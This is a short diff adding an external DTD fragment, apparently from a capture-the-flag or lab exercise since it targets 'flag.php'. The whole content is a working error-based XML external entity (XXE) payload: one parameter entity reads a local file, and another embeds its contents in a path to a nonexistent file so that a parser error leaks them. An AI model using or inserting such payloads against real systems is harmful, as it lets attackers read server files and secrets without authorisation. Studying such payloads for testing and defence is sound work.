@@ -1,0 +1,3 @@
+<!ENTITY % file SYSTEM "file:///flag.php">
+<!ENTITY % error "<!ENTITY content SYSTEM '%nonexistingfile;/%file;'>">
+
